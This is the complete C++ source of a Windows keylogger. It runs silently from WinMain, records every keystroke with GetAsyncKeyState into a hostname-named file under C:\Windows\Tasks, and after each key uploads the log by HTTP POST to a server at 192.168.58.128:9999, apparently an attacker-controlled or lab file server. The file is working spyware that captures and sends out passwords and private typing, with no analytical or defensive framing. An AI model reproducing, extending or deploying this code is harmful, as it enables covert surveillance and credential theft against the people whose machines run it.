#include <windows.h>
#include <wininet.h>
#include <fstream>
#include <string>
#include <sstream>
#include <iterator>
#pragma comment(lib, "wininet.lib")

std::string GetRecordFilename() {
    char hostname[256];
    DWORD len = sizeof(hostname);
    GetComputerNameA(hostname, &len);
    return std::string(hostname) + "_records.txt";
}

bool UploadToUpdog(const std::string& localPath) {
    // Read file content
    std::ifstream file(localPath, std::ios::binary);
    if (!file) return false;
    std::string data((std::istreambuf_iterator<char>(file)), {});
    file.close();

    // Prepare multipart body
    const std::string filename = GetRecordFilename();
    const std::string boundary = "----geckoformboundaryf1a17743dac0fbb521dd2e06e7b98e35";
    std::ostringstream body;
    body << "--" << boundary << "\r\n"
        << "Content-Disposition: form-data; name=\"file\"; filename=\"" << filename << "\"\r\n"
        << "Content-Type: text/plain\r\n\r\n"
        << data << "\r\n"
        << "--" << boundary << "\r\n"
        << "Content-Disposition: form-data; name=\"path\"\r\n\r\n"
        << "/home/minh/Downloads\r\n"
        << "--" << boundary << "--\r\n";
    const std::string bodyStr = body.str();

    // Open connection
    HINTERNET hInet = InternetOpenA("KeyLogger", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInet) return false;
    HINTERNET hConn = InternetConnectA(hInet,
        "192.168.58.128", 9999,
        NULL, NULL,
        INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConn) { InternetCloseHandle(hInet); return false; }

    // Create POST request
    HINTERNET hReq = HttpOpenRequestA(hConn,
        "POST", "/upload", NULL, NULL, NULL,
        INTERNET_FLAG_RELOAD, 0);
    if (!hReq) { InternetCloseHandle(hConn); InternetCloseHandle(hInet); return false; }

    // Send headers + body
    std::string headers = "Content-Type: multipart/form-data; boundary=" + boundary + "\r\n"
        "Content-Length: " + std::to_string(bodyStr.size()) + "\r\n";
    BOOL ok = HttpSendRequestA(hReq,
        headers.c_str(), (DWORD)headers.length(),
        (LPVOID)bodyStr.c_str(), (DWORD)bodyStr.size());

    InternetCloseHandle(hReq);
    InternetCloseHandle(hConn);
    InternetCloseHandle(hInet);
    return ok == TRUE;
}

void StartLogging() {
    std::string filename = GetRecordFilename();
    std::string localPath = "C:\\Windows\\Tasks\\" + filename;
    char c;
    for (;;) {
        for (c = 8; c <= 222; c++) {
            if (GetAsyncKeyState(c) == -32767) {
                std::ofstream write(localPath, std::ios::app);
                if ((c > 64 && c < 91) && !(GetAsyncKeyState(VK_SHIFT))) {
                    c += 32;
                    write << c;
                }
                else if (c > 64 && c < 91) {
                    write << c;
                }
                else {
                    switch (c) {
                    case '0': write << (GetAsyncKeyState(VK_SHIFT) ? ')' : '0'); break;
                    case '1': write << (GetAsyncKeyState(VK_SHIFT) ? '!' : '1'); break;
                    case '2': write << (GetAsyncKeyState(VK_SHIFT) ? '@' : '2'); break;
                    case '3': write << (GetAsyncKeyState(VK_SHIFT) ? '#' : '3'); break;
                    case '4': write << (GetAsyncKeyState(VK_SHIFT) ? '$' : '4'); break;
                    case '5': write << (GetAsyncKeyState(VK_SHIFT) ? '%' : '5'); break;
                    case '6': write << (GetAsyncKeyState(VK_SHIFT) ? '^' : '6'); break;
                    case '7': write << (GetAsyncKeyState(VK_SHIFT) ? '&' : '7'); break;
                    case '8': write << (GetAsyncKeyState(VK_SHIFT) ? '*' : '8'); break;
                    case '9': write << (GetAsyncKeyState(VK_SHIFT) ? '(' : '9'); break;
                    case VK_SPACE:  write << ' '; break;
                    case VK_RETURN: write << '\n'; break;
                    case VK_TAB:    write << '\t'; break;
                    case VK_BACK:   write << "<BACKSPACE>"; break;
                    case VK_DELETE: write << "<DEL>"; break;
                    default:        write << c;
                    }
                }
                write.close();
                UploadToUpdog(localPath);
                break;
            }
        }
    }
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    StartLogging();
    return 0;
}
